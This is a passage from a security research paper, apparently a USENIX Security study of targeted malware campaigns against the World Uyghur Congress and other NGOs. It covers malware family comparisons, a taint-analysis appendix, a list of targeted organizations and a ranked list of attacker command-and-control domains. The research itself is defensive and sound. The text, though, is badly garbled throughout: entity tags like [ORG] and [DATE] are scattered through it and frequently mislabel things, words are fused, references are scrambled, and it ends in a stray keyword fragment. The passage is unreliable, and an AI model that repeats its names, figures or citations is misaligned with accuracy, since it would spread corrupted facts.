[PERSON] Malware family and similarities . We found various de- grees of similarities between our clusters and targeted at- tacks reported in the wild . [ORDINAL] First , the \ufb01ve clusters above had the same C2 as the [ORG] DTL group reported by [ORG] FireEye in [DATE] November [DATE] 2013 and that the malware was of the same family as one of these clusters [WORK_OF_ART] \u2019 [WORK_OF_ART] ( [WORK_OF_ART] APT.9002 , not shown ) [ [CARDINAL] 9 ] . In particular , we found that one of our samples in that cluster had the same MD5 hash as those described in the [ORG] FireEye report and that [CARDINAL] eight had identical mani- fest resources . [ORG] FireEye claims that this malware has been used in targeted attacks against various governmental and industrial organizations . [ORDINAL] Second , malware in the [PERSON] Surtr cluster had the same be- havioral pro\ufb01le as samples used against the [NORP] Tibetan com- munity in [DATE] March [DATE] 2012 [ 7 ] . Although the [CARDINAL] two sets of sam- ples had different MD5 hashes , they both connected to the same C2 server ( shared with [PERSON] APT.9002 ) on the same port number , and exhibited the same behavior to estab- lish persistency on the victim \u2019s machine . [ORDINAL] Third , our [CARDINAL] 13 TravNet samples exhibited similar be- havior as those used against [NORP] Indian targets in [DATE] 2013 [ [CARDINAL] 2 ] . To do so , we obtained the samples used in [GPE] India , generated their behavioral pro\ufb01les , and compared them manually with the malware in our [ORG] TravNet cluster . Although both sets connected to different [CARDINAL] C2 servers and exhibited vari- ations in the way they searched the victims \u2019 \ufb01le system , we found that they both used the same communication protocol with the C2.Fourth , samples in another cluster communicated with the same C2 server and exhibited the same behavior as a [ORG] Vidgrab sample found in a malicious document sent to a victim in [GPE] Hong [GPE] Kong in [DATE] August [DATE] 2013 [ 8].Summary of \ufb01ndings . We found that [ORG] WUC has been targeted with several malware families in [DATE] the [DATE] last [DATE] year . We also showed that the [PERSON] Surtr and [PERSON] APT.9002 clusters corresponded to malware that [NORP] Citizenlab and [ORG] FireEye identi\ufb01ed as having targeted the [NORP] Tibetan community , as well as other political and industrial organizations [ [CARDINAL] 7 , 9 ] . Furthermore , [PERCENT] 24 % of our malware ( including [PERSON] Surtr , [PERSON] APT.9002 and [CARDINAL] three other clusters ) had [CARDINAL] at [CARDINAL] least [CARDINAL] one [CARDINAL] C2 domain in common , which was identical to those of the [NORP] Citizenlab and [ORG] FireEye reports.6 Future WorkSeveral directions for future work arise from this work . We brie\ufb02y discuss them below . Attack vectors and generalization . Our analysis is limited to attack vectors used against [ORG] WUC . Similar stud- ies on a wider range of targets would bene\ufb01t understand- ing this emerging threat better . Further , our attack vec- tors distributed over email channels and have [CARDINAL] two main limitations . [ORDINAL] First , it is possible that our volunteers have been attacked via other channels besides email . Sec- ond , although we have seen various organizations tar- geted with the same malware as [ORG] WUC , it is generally hard to determine with certainty which victims were the primary target of these attacks . Therefore , it is possi- ble that other victims have been targeted with additional attack vectors when the attacks did not involve [ORG] WUC . Further research is needed to overcome these limitations Exploring different channels that attackers use for dis- tributing malicious payloads is important . As a step to- wards this goal , we are currently collaborating with the Safebrowsing team at Google to investigate the emer- gent threat of watering - hole attacks . These attacks are conceptually very similar to drive - by download attacks with [CARDINAL] one key difference : They compromise very speci\ufb01c websites commonly visited by the targeted community ( e.g. , a company \u2019s website ) and wait for victims to visit the website . As compared to spear phishing , watering- hole attacks offer the advantage of potentially targeting a fairly large number of victims ( e.g. , all employees of a large company ) before raising suspicion . We conjecture that the small number of suspicious links in our dataset may be due to the small size of the targeted organizations and the public availability of their employees \u2019 email ad- dresses . Other attack vectors include but are not limited to packets injection to redirect victims to malicious servers ( similar to those used in watering - hole attacks ) and phys- ical attacks on the victims \u2019 devices [ [CARDINAL] 3 ] . Detecting these attacks would require completely different methodolo- gies than the one we used in this paper . Monitoring . We have seen that a few high - pro\ufb01le mem- bers of the [ORG] Uyghur community were compromised and that their email accounts were being used as stepping stones to carry out targeted attacks . Although it is possi- ble that these email accounts were compromised via tar- geted attacks , we have not yet con\ufb01rmed this hypothesis . More generally , we do not know yet what is the speci\ufb01c aim of these targeted attacks . Monitoring the full lifecy- cle of targeted attacks would require novel measurement systems , deployed at the end users , that can identify com- promises without being detected . Pinpointing the geolocation of attackers carrying out targeted attacks , or attack attribution , is another open554 23rd [ORG] USENIX [ORG] Security SymposiumUSENIX Association12monitoring challenge . Marczak et al . were able to at- tribute targeted attacks to governments in [LOC] the [LOC] Middle [LOC] East by analyzing relationships of cause and effect be- tween compromises and real - world consequences [ [CARDINAL] 16 ] . In contrast to monitoring and attack attribution , this pa- per has presented a extensive , complementary analysis of the life cycle of targeted attacks before the compromise . Large - scale malware analysis and clustering . We found it challenging to ( a ) cluster targeted malware and ( b ) locate similar samples . [ORDINAL] First , this malware sometimes exhibits signi\ufb01cant similarity in its logic and different malware may also use the same [ORG] Command and Control ( C2 ) infrastructure . As a result , traditional clustering al- gorithms tend not to work very well . [ORDINAL] Second , we located similar samples based on a limited set of indicators such as C2 , cryptographic hash , or [ORG] YARA signatures , how- ever , we feel that our current capability in that respect has a lot of room for improvement . We foresee that a search engine that can , for example , locate malware matching certain indicators out of an arbitrarily large corpus would be a useful instrument for researchers working on tar- geted attacks . Our analysis of CVEs highlights that telemetry data from commercial [PRODUCT] AVs is not always reliable . Our analy- sis complemented with taint - analysis was largely manual and time - intensive . Analysis techniques to quickly diag- nose known CVEs directly from given exploits is an open problem and perhaps one of independent interest . [GPE] Defenses . Our \ufb01ndings con\ufb01rm that [PRODUCT] AVs may miss known CVEs , even [DATE] years after their release dates . Clearly , known CVEs contribute a large part of the emerging threat of targeted attacks . Understanding why commercial [PRODUCT] AVs miss known attacks conclusively , for example to tradeoff false positives or performance for security , is an important research direction . Designing effective defenses against targeted attacks is a major re- search challenge which depends on our ability to under- stand the threat at hand . As part of future work , one could evaluate the effectiveness of novel defenses based on the \ufb01ndings from this paper . As a small step towards that goal , we plan to soon deploy a webmail plugin that combines metadata and stylometry analysis [ [CARDINAL] 17 ] to detect contact impersonation.7 [PRODUCT] ConclusionWe have presented an empirical analysis of a dataset capturing [DATE] four [DATE] years of targeted attacks against a human- rights NGO . [ORDINAL] First , we showed that social engineering was an important component of targeted attacks with signi\ufb01cant effort paid in crafting emails that look legiti- mate in terms of topics , languages , and senders . We also found that victims were targeted often , over the course of [DATE] several [DATE] years , and simultaneously with colleaguesfrom the same organization . [ORDINAL] Second , we found that malicious documents with well - known vulnerabilities were the most common attack vectors in our dataset and that they tended to bypass common defenses deployed in webmails or users \u2019 computers . Finally , we provided an analysis of the targeted malware and showed that over a quarter of samples exhibited similarities with entities known to be involved in targeted attacks against a variety of industries . We hope that this paper , together with the public release of our malware dataset , will facilitate future research on targeted attacks and , ultimately , guide the deployment of effective defenses against this threat . Acknowledgements . The authors would like to thank the anonymous reviewers , our shepherd [PERSON] Stuart [PERSON] Schechter , and [PERSON] Peter [PERSON] Druschel for their useful feedback . We would also like to acknowledge [PERSON] Karmina [PERSON] Aquino ( F - Secure ) , Emiliano Martinez ( [ORG] VirusTotal ) , [PERSON] Mila [PERSON] Parkour ( Conta- gio ) , and [ORG] Nart [ORG] Villeuneuve ( [ORG] FireEye ) for their help locat- ing similar malicious documents . Finally , we thank [ORG] the [ORG] Max [ORG] Planck [ORG] Society , [ORG] the [ORG] Ministry [ORG] of [ORG] Education of Singa- pore under Grant No . R-252 - 000 - 495 - 133 , and the [ORG] NSF under Grant No . [CARDINAL] CNS-1116777 for partially supporting this work . References[1 ] url [CARDINAL] Tech.space.reportber content / uploads/2013 / downloads / [WORK_OF_ART] Inside [WORK_OF_ART] Report by [ORG] Infosec [ORG] Consortium.pdf.attacks url [WORK_OF_ART] Inside [WORK_OF_ART] TAO : Documents reveal top nsa hacking unit.url powerful - toolbox - in - effort - to - spy - on - global - networks - a- [CARDINAL] 940969.html.[4 ] [ORG] The [ORG] Slingshot [ORG] Project . url [ 5 ] BAILEY , M. , ANDERSEN , J. , MORLEYMAO , [PERSON] Z. , AND [PERSON] JAHANIAN , [PERSON] F. [PERSON] Automated classi\ufb01cation and analysis of internet malware . In [ORG] Proceedings [ORG] of [ORG] Recent [ORG] Advances [ORG] in [ORG] Intrusion [ORG] Detection [ORG] ( RAID [ORG] 2007).[6 ] [ORG] BILGE , [ORG] L. , AND [PERSON] DUMITRAS , T. Before we knew it : An empirical study of zero [DATE] - [DATE] day attacks in the real world . In [GPE] Proceedings of the [DATE] 2012 [ORG] ACM conference on Computer and communications security ( CCS 2012 ) ( [CARDINAL] 2012).[7 ] CITIZEN LAB.Surtr : [PERSON] Malware community.family tar- url targeting - the - tibetan - community/.[8 ] CONTAGIO . url [ORG] FIREEYE . Supply chain analysis : From quartermaster tosunshop . Tech . rep . [ORG] USENIX Association23rd [ORG] USENIX Security Symposium [CARDINAL] 55513[10 ] HARDY , S. , CRETE - NISHIHATA , [ORG] M. , [ORG] KLEEMOLA , [NORP] K. , SENFT , [ORG] A. , [ORG] SONNE , [ORG] B. , [ORG] WISEMAN , [PERSON] G. , AND [ORG] GILL , [ORG] P. [ORG] Targeted threat index : Characterizing and quantifying politically - motivated targeted malware . In [PERSON] Proceedings of the 23rd [EVENT] USENIX [EVENT] Security [EVENT] Symposium ( [GPE] San [GPE] Diego , CA ) . [ [CARDINAL] 11 ] INFORMATION WARFARE MONITOR . Tracking ghost- net : Investigating a cyber espionage network . Tech . rep . , 2009.[12 ] JANA , S. , AND SHMATIKOV , [PERSON] V. [PERSON] Abusing \ufb01le processing in malware detectors for fun and pro\ufb01t . In [GPE] Proceedings of the [ORDINAL] 33rd IEEE Symposium on Security & Privacy ( [GPE] San [GPE] Francisco , CA).[13 ] KASPERSKY . The nettraveler ( aka TravNeT ) . Tech . rep.url the - net - traveler - part1-\ufb01nal.pdf.[14 ] [ORG] KRUEGEL , C. , KIRDA , E. , [ORG] COMPARETTI , [PERSON] P. [PERSON] M. , [ORG] BAYER , U. , AND HLAUSCHEK , [PERSON] C. [PERSON] Scalable , behavior- based malware clustering . In [PERSON] Proceedings of the [ORDINAL] 16th [EVENT] Annual [EVENT] Network [EVENT] and [EVENT] Distributed [EVENT] System [EVENT] Security Sympo- sium ( NDSS [DATE] 2009 ) ( [DATE] 2009 ) . APT1[15 ] MANDIANT.exposingoneof rep . ,chi- 2013.nas cyber espionage units . url MARCZAK , [PERSON] W. [PERSON] R. , SCOTT - RAILTON , [ORG] J. , MARQUIS- BOIRE , M. , AND PAXSON , V. When governments hack opponents : A look at actors and technology . In Proceed- ings of [DATE] the [DATE] 23rd [EVENT] USENIX [EVENT] Security [EVENT] Symposium ( [GPE] San [GPE] Diego , CA).[17 ] [PERSON] NARAYANAN , A. , PASKOV , H. , [ORG] GONG , [PERSON] N. [PERSON] Z. , [PERSON] BETHEN- [PERSON] COURT , [ORG] J. , [ORG] CHUL , E. , [ORG] SHIN , [NORP] R. , AND [ORG] SONG , [NORP] D. On the feasibility of internet - scale author identi\ufb01cation . In Pro- ceedings of the [ORDINAL] 33rd conference on IEEE Symposium on Security and Privacy . IEEE ( [GPE] San [GPE] Francisco , CA , [CARDINAL] 2012).[18 ] NATIONALVULNERABILITYDATABASE.url RALPH LANGNER . To kill a centrifuge : A technical anal- ysis of what stuxnets creators tried to achieve . Tech . rep . , [CARDINAL] 2013.[20 ] REUTERS.Journalists , fromhackers : tack www.reuters.com/article/2014/03/28/us-media- cybercrime-idUSBREA2R0EU20140328.media researchers.[21 ] [ORG] SONG , [NORP] D. , [ORG] BRUMLEY , [NORP] D. , [ORG] YIN , [ORG] H. , [GPE] CABALLERO , [ORG] J. , JAGER , [ORG] I. , [ORG] KANG , [PERSON] M. [PERSON] G. , [GPE] LIANG , Z. , [ORG] NEWSOME , [ORG] J. , POOSANKAM , P. , AND SAXENA , P. Bitblaze : A new ap- proach to computer security via binary analysis . In Pro- ceedings of [ORG] the [ORG] 4th [ORG] International [ORG] Conference on Informa- tion Systems Security ( [GPE] Hyderabad , [GPE] India , [CARDINAL] 2008).[22 ] SYMANTEC.2013security url response / publications/ threatreport.jsp.internetvolumereport , Tech.18.[23 ] WIRED.Googlehackerssource url morecodethan30targeted companies . A Targeted organizationsOrganization World Uyghur Congress ( [ORG] WUC ) [ORG] East [ORG] Turkestan [ORG] Union in [LOC] Europe ( [ORG] ETUE ) [NORP] Australian Uyghur Association Euro [ORG] - [ORG] Asia [ORG] Foundation in [GPE] Turkey Uyghur [NORP] Canadian Association Germany [ORG] Uyghur [ORG] Women [ORG] Committee [ORG] Radio [ORG] Free [ORG] Asia ( [ORG] RFA ) [ORG] France [ORG] Uyghur [ORG] Association [ORG] Eastern [ORG] Turkestan [ORG] Australian [ORG] Association ( ETAA ) [ORG] Uyghur [ORG] American [ORG] Association ( [ORG] UAA ) [ORG] Eastern [ORG] Turkestan [ORG] Uyghur [ORG] Association in [GPE] Netherlands Netherland [ORG] Uyghur [ORG] Union [ORG] United [ORG] Nations for a Free Tibet ( [GPE] UK ) [ORG] Eastern [ORG] Turkestan [ORG] Culture and [ORG] Solidarity [ORG] Association [ORG] Viktoria [ORG] Uyghur [ORG] Association [ORG] Japan [ORG] Uyghur [ORG] Association [GPE] Switzerland East Turkestan Association [ORG] Hacettepe [ORG] University [ORG] Turkey [ORG] Kazakhstan [ORG] Academy [ORG] of [ORG] Poetry [ORG] Belgium [ORG] Uyghur [ORG] Association [ORG] Kyrgyzstan [ORG] Uyghur [ORG] Association Uyghur [NORP] Canadian Society Uyghur Academy Munich Uyghur Elders Meshrep [NORP] Republican Uyghur Cultural Center of Kazakhstan Sweden Uyghur Association [ORG] Virginia [ORG] Department [ORG] of [ORG] Social [ORG] Services [ORG] Unrepresented [ORG] Nations [ORG] and [ORG] Peoples [ORG] Organization [ORG] ( UNPO ) [GPE] Sociale [GPE] Verzekeringsbank ( [ORG] SVB ) NGO Netherland [ORG] China [ORG] Democratic [ORG] Party ( [ORG] CDP ) [ORG] Finland [ORG] Uyghur [ORG] Association [ORG] Jet [ORG] Propulsion [ORG] Laboratory , founded by [ORG] NASA [ORG] Pennsylvania [ORG] State [ORG] University [GPE] US [ORG] Uyghur [ORG] Support [ORG] Group [ORG] Nederland [ORG] Norway Uyghur Committee [ORG] Amnesty [ORG] International [ORG] Association [ORG] of [ORG] European [ORG] Border [ORG] Regions ( AEBR ) [ORG] Howard [ORG] University [ORG] US [ORG] Initiatives [ORG] for [ORG] China [ORG] LSE [ORG] Asia [ORG] Research [ORG] Center and Silk Road Dialogue The Government - in - Exile of [GPE] the [GPE] Republic [GPE] of [GPE] East Turkistan Uyghur Human Rights Project ( UHRP ) [ORG] Australian [ORG] Migration [ORG] Options [ORG] Pty [ORG] Ltd [ORG] Agence [ORG] France [ORG] - Presse [ORG] National [ORG] Endowment [ORG] for [ORG] Democracy ( [ORG] NED ) [ORG] PEN [ORG] International [ORG] Syracuse University US Worldwide Protest in Honor and [ORG] Support [ORG] of [ORG] Uyghurs [ORG] Dying [ORG] for [ORG] Freedom [ORG] Australian [ORG] Government [ORG] - [ORG] Department [ORG] of [ORG] Foreign [ORG] Affairs [ORG] and [ORG] Trade [ORG] New [ORG] Tang [ORG] Dynasty [ORG] Television China [ORG] The [ORG] Epoch [ORG] Times [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs [ORG] Norway [ORG] International [ORG] University [ORG] of [ORG] Kagoshima [ORG] Japan [ORG] Association of [ORG] Islam [ORG] Religion [ORG] Bilkent [ORG] University [ORG] Turkey [ORG] Embassy of [GPE] Azerbaijan in [GPE] Beijing [ORG] Indiana [ORG] University [ORG] School [ORG] of Law [ORG] - Indianapolis LL.M. [ORG] KYOCERA [ORG] Document [ORG] Solutions [ORG] Development [ORG] America [ORG] New [ORG] York [ORG] Times [ORG] P\ufb01zer [ORG] Government [ORG] Research [ORG] Laboratory [ORG] - [ORG] Clinical [ORG] Pharmacology [GPE] Saudi [GPE] Arabia [GPE] - [GPE] Luggage [GPE] Bags and [ORG] Cases [ORG] Company [ORG] Students for a Free Tibet Sweden Uyghur Education Union Uyghur International Culture Center The Protestant Church Amsterdam Swiss Agency for Development and Cooperation ( SDC ) [ORG] Kargyzstan [ORG] American [ORG] Bar [ORG] Association [ORG] for [ORG] Attorneys in [GPE] US Assistance for Work Germany [GPE] Frankfurt Bishkek Human Rights Committee Central Tibetan Administration ( CTA ) Chinese Translation Commercial Business Circassian Cultural Center ( CHKTS ) [ORG] Colombian [ORG] National [ORG] Radio [ORG] Embassy of [GPE] the [GPE] United [GPE] States in [GPE] Australia Europa Haber Newspaper Turkey Europe - China Cultural Communication ( ECCC ) Freelance Reporter and writer [ORG] Turkey [ORG] Goethe [ORG] University [GPE] Frankfurt am [ORG] Main [ORG] Germany [ORG] Human [ORG] Rights [ORG] Campaign in China International Enterprise ( IE ) - Singapore Government International Tibet Independence Movement Jasmine Revolution China ( Pro - Democracy [NORP] Protests ) [ORG] Socialist [ORG] Party ( [GPE] Netherlands ) [GPE] Los [GPE] Angeles Times [PERSON] Milli [PERSON] Gazete ( [ORG] National [ORG] Newspaper [ORG] Turkey ) [NORP] Norwegian [ORG] Tibet [ORG] Committee Photographer Turkey [ORG] CNN International [GPE] Hong [GPE] Kong Reporters Without [ORG] Borders [ORG] Republican [ORG] National [ORG] Lawyers [ORG] Association [GPE] Maryland Save [ORG] Tibet [ORG] - [ORG] International [ORG] Campaign [ORG] for Tibet Society for Threatened People ( STPI ) Southern Mongolian Human Rights Stucco Manufacturers Association US Superior School of Arts France [ORG] The [ORG] George [ORG] Washington [ORG] University [ORG] TurkishNews [ORG] Newspaper [ORG] US [ORG] Bureau [ORG] of [ORG] Transportation [ORG] Statistics Umit [ORG] Uighur [ORG] Language [ORG] School [ORG] Union [ORG] of Turkish [ORG] - [ORG] Islamic [ORG] Cultural [ORG] Associations in Europe [ORG] University [ORG] of [ORG] Adelaide [ORG] Melbourne [ORG] University of [GPE] Khartoum Sudan [GPE] US Embassy and [ORG] Consulate in [GPE] Munich [GPE] Germany [PERSON] Wei [PERSON] Jingsheng [PERSON] Foundation [ORG] Xinjiang [ORG] Arts [ORG] Institute [GPE] China [PERSON] Yenicag [PERSON] Gazetti ( Newspaper Turkey ) [ORG] American [ORG] University [ORG] Islamic [ORG] Jihad [ORG] Union # Recipients # Emails53 [DATE] 2012556 [DATE] 23rd [ORG] USENIX [ORG] Security [NORP] SymposiumUSENIX Association14B [NORP] Dynamic taint - assisted analysis of mali - cious documentsB.1 Methodology We use [ORG] BitBlaze [ [CARDINAL] 21 ] to perform dynamic taint - tracking analy- sis of the targeted applications under the malicious documents as input and con\ufb01gure it to report [CARDINAL] four kinds of reports : ( a ) when a tainted Extended Instruction Pointer ( [ORG] EIP ) is executed , ( b ) when a memory fault is triggered in the target program , ( c ) when a new process is spawned from the target program , or ( d ) when the analysis \u201c times out \u201d ( i.e. , runs without interrup- tion for [TIME] over [TIME] 15 [TIME] minutes ) . To mark malicious documents as a source of taint , we tainted the network inputs and routed the malicious input \ufb01le using netcat . Additionally , we set Bit- Blaze to exit tracing at the detection of null pointer exceptions , user exceptions , tainted EIPs , and process exits before the start of the trace . A tag was generated from the trace by obtain- ing the last instruction with tainted operands , and matching it with the list of loaded modules generated by TEMU . Our guest ( analysis ) system con\ufb01guration used in the image consists of clean installations of Windows XP SP2 with TEMU drivers and [ORG] Microsoft [ORG] Of\ufb01ce [ORG] 2003 . B.2 Results Anti - virus software typically uses static signature - matching or whitelisting techniques to analyze malware . To validate the analysis results available from commercial AV , we ran a sep- arate semi - automated dynamic analysis of the targeted applica- tion under our malicious documents . Out of [CARDINAL] 817 unique input documents ( [CARDINAL] 725 malicious and [QUANTITY] 92 [QUANTITY] legitimate ) , [CARDINAL] 295 timed out with our [ORG] BitBlaze analysis without reporting a tainted [ORG] EIP , a memory fault , or a newly spawned [WORK_OF_ART] process.2 [WORK_OF_ART] Another [WORK_OF_ART] 13 [WORK_OF_ART] of [WORK_OF_ART] them [WORK_OF_ART] were incompatible with our anal- ysis infrastructure ( using a more recent DOCX format ) . We could not compare these cases directly to the results obtained from [ORG] VirusTotal . Therefore , we focus on the remaining [CARDINAL] 509 malicious documents in the evaluation . Ef\ufb01cacy of Taint EIP Detection . Taint - tracking detected tainted [ORG] EIP execution in [CARDINAL] 477 out of the [CARDINAL] 509 documents . In [CARDINAL] 19 cases of the undetected [CARDINAL] 32 cases , however , a new process was spawned without it being detected by taint - tracking . We treat these as false negatives in taint - tracking . We speculate that this is likely to be due to missed direct \ufb02ows , untracked indirect \ufb02ows ( via control dependencies , or table - lookups ) , or attacks using non - control-\ufb02ow hijacking attacks ( such as argu- ment corruption ) . [CARDINAL] 13 documents did not lead to a tainted [ORG] EIP execution , but instead caused a memory fault . This could be due to a difference in our test infrastructure and the victim \u2019s , or an attempt to evade analysis . In [CARDINAL] 33 of the [CARDINAL] 477 cases where tainted [ORG] EIP was detected , no new spawned process was created , and the tainted [ORG] EIP instruction did not correspond to any shell- code . All these cases correspond to a particular instruction trig- gering the tainted [ORG] EIP detection in [GPE] MSO.DLL , a dynamic - link library found in [ORG] Microsoft [ORG] Of\ufb01ce installations . To understand this case better , we manually created blank benign documents and fed them to Microsoft Of\ufb01ce \u2014 they too triggered tainted2We believe [CARDINAL] 150 of these are due to user - interaction which we could not presently automate , and the remaining could potentially be ana- lyzed with a faster test platform ; we plan to investigate this in the fu- [CARDINAL] 1121385TaintedTimeoutSpawnedFaultDOCXFigure [CARDINAL] 12 : Breakdown of dynamic taint - assisted analy- sis , and comparison to [ORG] VirusTotal [ORG] AV results . Single , Multiple , Heuristics , and Unknown correspond to the dif- ferent AV tags assigned to documents . The main bars show the detection result from [ORG] BitBlaze : ( a ) Detected by Tainted [ORG] EIP execution , ( b ) Timeout , ( c ) Spawned pro- cess without tainted [ORG] EIP execution , ( d ) [PERSON] Memory [PERSON] Fault without tainted [ORG] EIP execution , and ( e ) DOCX unable to run in our analysis environment . Within each main bar , each stacked bar represents the corresponding tag given by [ORG] VirusTotal . EIP detections . We treat these cases as false positives in taint detection , possibly because of benign dynamic generation of code . All the remaining cases ( i.e. , [CARDINAL] 444 out of [CARDINAL] 477 ) are legiti- mate exploits that we could con\ufb01rm to execute shellcode . Dynamic Taint versus [ORG] VirusTotal . Figure [CARDINAL] 12 shows the de- tailed comparison of taint - assisted classi\ufb01cation of vulnera- bilities versus the results from [ORG] VirusTotal . Out of a total of [CARDINAL] 477 documents on which tainted [ORG] EIP was detected , [ORG] VirusTotal tagged [CARDINAL] 397 documents with [CARDINAL] one or more CVEs . Of the remain- ing [CARDINAL] 80 cases that are detected by tainted [ORG] EIP execution , [CARDINAL] 24 are undetected by [ORG] VirusTotal , and [CARDINAL] 56 are detected , but marked Un- known ( i.e. , no [ORG] CVE assigned ) by [ORG] VirusTotal . Dynamic taint analysis to determine the tainted [ORG] EIP was helpful to further re\ufb01ne the results of AV detection for a majority of these [CARDINAL] 56 tagged - Unknown cases . Speci\ufb01cally , for [CARDINAL] 55 out of the [CARDINAL] 56 doc- uments , taint - assisted manual analysis was able to resolve it to the exploited CVE.Out of a total of [CARDINAL] 477 documents on which tainted [ORG] EIP was detected , [ORG] VirusTotal tagged [CARDINAL] 397 documents with [CARDINAL] one or more CVEs . Our taint - assisted manual analysis agrees with the [ORG] VirusTotal CVE tag results on [CARDINAL] 372 of these [CARDINAL] 397 . That is , [CARDINAL] 372 documents were detected to execute a tainted [ORG] EIP for which we could manually correlate to a single CVE that was the same as the one reported by a majority of the [PRODUCT] AVs in VirusTotal.3 Thus , for a large majority of the cases , taint - assisted analysis agrees with the AV results . Of the remaining [CARDINAL] 25 cases , [CARDINAL] 17 could be identi\ufb01ed as misclassi\ufb01cations because the [ORG] CVE reported by most of the [PRODUCT] AVs in [ORG] VirusTotal was not the one that affected the program . The [CARDINAL] 8 remaining documents were tagged by taint analysis as being false positives even though a [ORG] CVE was ob- tained from VirusTotal.3Note that different [PRODUCT] AVs often tag the same vulnerability with dif- ferent tags in [ORG] VirusTotal . We took the tag given by a majority of the [DATE] dtl.dnsd.me [DATE] 66 [DATE] ns.dns3-domain.com [DATE] 55 dtl.eatuo.com [CARDINAL] 44 update.googmail.org 31 dtl6.mooo.com [CARDINAL] 29 www.discoverypeace.org [CARDINAL] 26 email.googmail.org [CARDINAL] 22 news.googmail.org 22 softmy.jkub.com [CARDINAL] 15 dnsmm.bpa.nu [CARDINAL] 11 zeropan007.3322.org [CARDINAL] 10 wwzzsh.3322.org 9 3.test.3322.org.cn 8 1.test.3322.org.cn 8 2.test.3322.org.cn 8 eemete.freetcp.com 8 apple12.crabdance.com 8 wolf001.us109.eoidc.net [CARDINAL] 7 4.test.3322.org.cn 7 etdt.cable.nu 6 br.stat-dns.com 6 www.southstock.net [CARDINAL] 6 ns1.3322.net [CARDINAL] 5 www.uyghur.25u.com 5 ns1.oray.net [CARDINAL] 5 jhska.cable.nu [CARDINAL] 5 test195.3322.org [CARDINAL] 5 ns1.china.com 5 a2010226.gicp.net [CARDINAL] 5 logonin.uyghuri.com 4 macaonews.8800.org 4 book.websurprisemail.com 4 desk.websurprisemail.com 4 test.3322.org.cn 4 liveservices.dyndns.info [CARDINAL] 4 portright.org 4 video.googmail.org [CARDINAL] 4 www.guzhijiaozihaha.net [CARDINAL] 4 www.googmail.org [CARDINAL] 4 2.test.3322.org 3 dcp.googmail.org [CARDINAL] 3 test.3322.org [CARDINAL] 3 [ORG] np6.dnsrd.com 3mzyzy.vicp.net [CARDINAL] 3 mygoodbug.dnsd.info 3 www.uyghuri.mrface.com [CARDINAL] 3 6.test.3322.org.cn [CARDINAL] 3 uyghur.sov.tw [CARDINAL] 3 3.test.3322.org 3 newwhitehouse.org 3 goodnewspaper.f3322.org 3 nskupdate.com 3 webmonder.gicp.net [CARDINAL] 3 betterpeony.com [CARDINAL] 3 4.test.3322.org [CARDINAL] 3 9.test.3322.org.cn [CARDINAL] 3 8.test.3322.org.cn 3 1.test.3322.org 3 radio.googmail.org [CARDINAL] 3 7.test.3322.org.cn [CARDINAL] 3 tokyo.collegememory.com 2 webproxy.serveuser.com 2 www.bbcnewes.net [MONEY] 2 [MONEY] done.youtubesitegroup.com [MONEY] 2 alma.apple.cloudns.org 2 webmailsvr.com 2 polat.googmail.org [CARDINAL] 2 religion.xicp.net [CARDINAL] 2 connectsexy.dns-dns.com 2 dns3.westcowboy.com [CARDINAL] 2 apple12.co.cc 2 worldmaprsh.com 2 phinex127.gicp.net [DATE] 2 [DATE] wxjz.6600.org [DATE] 2 gecko.jkub.com 2 smtp.126.com 2 errorslog.com [CARDINAL] 2 uyghurie.51vip.biz [CARDINAL] 2 tanmii.gicp.net [CARDINAL] 2 religion.8866.org 2 blogging.blogsite.org 2 softjohn.ddns.us [CARDINAL] 2 report.dns-dns.com [CARDINAL] 2 newyorkonlin.com 2 tw252.gicp.net [CARDINAL] 2 tomsonmartin.ikwb.com 2www.info-microsoft.com 2 www.uyhanur.nna.cc [CARDINAL] 2 www.micosofts.com 2 a.yahoohello.com [CARDINAL] 1 bc1516.7766.org 1 msdn.homelinux.org 1 www.avasters.com [CARDINAL] 1 [ORG] nbsstt.3322.org 1 goodnewspaper.3322.org 1 webposter.gicp.net [CARDINAL] 1 uyghur1.webhop.net [CARDINAL] 1 webwx.3322.orgxiexie.8866.org 1 guanshan.3322.org 1 leelee.dnset.com [CARDINAL] 1 uygur.eicp.net [CARDINAL] 1 kxwss.8800.org 1 rc.arkinixik.com 1 www.uusuanru.nna.cc 1 uxz.fo.mooo.com 1 uygur.51vip.biz [CARDINAL] 1 peopleunion.gicp.net 1 free1000.gnway.net [CARDINAL] 1 uxz.fo.dnsd.info [CARDINAL] 1 wodebeizi119.jkub.com 1 itsec.eicp.net [CARDINAL] 1 stormgo.oicp.net [CARDINAL] 1 boy303.2288.org [CARDINAL] 1 webjz.9966.org 1 zbing.strangled.net 1 tommark5454.xxxy.info [CARDINAL] 1 oyghur1.webhop.net [CARDINAL] 1 addi.apple.cloudns.org 1 toolsbar.dns0755.net [CARDINAL] 1 home.graf\ufb01ti.net [CARDINAL] 1 statistics.netrobots.org 1 freesky365.gnway.net [CARDINAL] 1 greta.ikwb.com [CARDINAL] 1 englishclub.2288.org 1 mm.utf888.com 1 annchan.mrface.com 1 www.shine.4pu.com 1 copy.apple.cloudns.org 1 uyghuri.mrface.com 1 tt9c.2288.org 1 forum.universityexp.com 116googlehk.dynamicdns.co.uk 1 blog.sina.com.cn 1 uyghur.epac.to 1 xinxin20080628.gicp.net 1 yah00mail.gicp.net 1 hbnjx.6600.org 1 humanbeing2009.gicp.net [CARDINAL] 1 webhelp01.freetcp.com 1 mobile.yourtrap.com 1 www.jiapin.org 1 ibmcorp.slyip.com 1 star2.ksksz.com 1 www.yahooprotect.com 1 xiexie.8866.org 1 img.mic-road.com [CARDINAL] 1 photo.googmail.org 1 tonylee38.gicp.net [CARDINAL] 1 suggest.dns1.us 1 worldview.instanthq.com 1 goodnewspaper.gicp.net [CARDINAL] 1 abc69696969.vicp.net [CARDINAL] 1 put.adultdns.net [CARDINAL] 1 loadbook.strangled.net [CARDINAL] 1 internet.3-a.net 1 news.scvhosts.com 1 mydeyuming.cable.nu 1 gshjl.3322.org 1 forever001.dtdns.net [CARDINAL] 1 grt1.25u.com [DATE] 1 [DATE] kaba.wikaba.com [DATE] 1 [DATE] frank.3feet.com [DATE] 1 liveservices.dyndns.tv 1 inc.3feet.com 1 1nsmm.bpa.nu 1 www.yahooprotect.net [CARDINAL] 1 webwxjz.3322.org 1 thankyou09.gicp.net 1 soft.epac.to 1 www.yahooip.net [DATE] 1 [DATE] msejake.7766.org [DATE] 1 www.yahoohello.com [CARDINAL] 1", "generated_text": "the PDF; targeted attacks; Chinese; non-governmental organizations; individuals; tools; at-tack vectors; malware; email; individuals; organizations; The majority; vulnerabilities; common defenses; the emails; the malware; malware families; Tibetan; NGOs; Ten; Turkey; the Middle East; Pakistan; the attackers; victims; their 